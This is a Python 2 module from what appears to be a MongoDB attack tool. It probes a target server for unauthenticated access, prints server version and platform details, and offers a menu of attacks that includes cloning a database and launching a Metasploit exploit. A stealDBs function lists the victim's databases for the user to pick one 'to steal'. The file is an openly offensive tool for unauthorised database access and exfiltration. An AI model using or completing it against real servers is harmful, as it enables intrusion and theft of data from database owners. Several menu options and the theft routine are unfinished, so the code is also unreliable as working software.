import pymongo


def netAttacks(target, dbPort, myIP, myPort):
    print "DB access attacks(mongoDB)"
    print "========================="
    mongoOpen = False
    mgtSelect = True
    print "Checking to see if crendentials are need"
    needCreds = mongoScan(target,dbPort)
    if needCreds[0]==0:
        conn = pymongo.MongoClient(target,dbPort)
        print target
        print "\n" + str(dbPort)
        print "Successful access with no credentials!"
        mongoOpen = True
    elif needCreds[0]==1:
        print "login required!"
        victimUser = raw_input("Enter server username:")
        victimPass = raw_input("Enter server password:")

    elif needCreds[0]==2:
        conn = pymongo.MongoClient(target,dbPort)
        print "Access check failure. Testing will continue but will be unreliable."
        mongoOpen = True
    elif needCreds[0]==3:
        print "Counldn't connect to MongoDB server."

    if mongoOpen == True:
        while mgtSelect:
            print "\n"
            print "1-Get Server Version and Platform"
            print "2-Enumerate Databases/Collections/Users"
            print "3-Check for GridFS"
            print "4-Clone a Database"
            print "5-Launch Metasploit Exploit for Mongo < 2.2.4"
            print "6-Return to Main Menu"
            attack = raw_input("Select an attack: ")

            if attack == '1':
                print "\n"
                getPlatInfo(conn)
            if attack == '4':
                print "\n"
                if myIP == "NOT SET":
                    print "Target database not set"
                else:
                    stealDBs(myIP,target,conn)



            elif attack == '6':
                return



def stealDBs(myDBIP,victim,mongoConn):
    dbList = mongoConn.database_names()
    dbLoot = True
    menuItem = 1

    if len(dbList) == 0:
        print "Can't get a list of databases to steal.  The provided credentials may not have rights."
        return
    for dbname in dbList:
        print str(menuItem) + "_" + dbname
        menuItem += 1
    while dbLoot:
        dbLoot = raw_input("Select a database to steal:")
        if int(dbLoot) >= menuItem:
            print "Invalid selection."
        else:
            break


def getPlatInfo (mongoConn):
	print "Server Info:"
	print "MongoDB Version: " + mongoConn.server_info()['version']
	print "Debugs enabled : " + str(mongoConn.server_info()['debug'])
	print "Platform: " + str(mongoConn.server_info()['bits']) + " bit"
	print "\n"
	return

def mongoScan(ip,port):
    try:
        conn = pymongo.MongoClient(ip,port,connectTimeoutMS=4000,socketTimeoutMS=4000)
        try:
            dbVer= conn.server_info()['version']
            conn.close();
            return [0,dbVer]
        except Exception, e:
            if str(e).find('need to login')!=-1:#If find the 'need to login' in error message, we can consider target need credentials
                conn.close();
                return[1,None]
            else:
                conn.close();
                return[2,None]
    except:
        return [3,None]

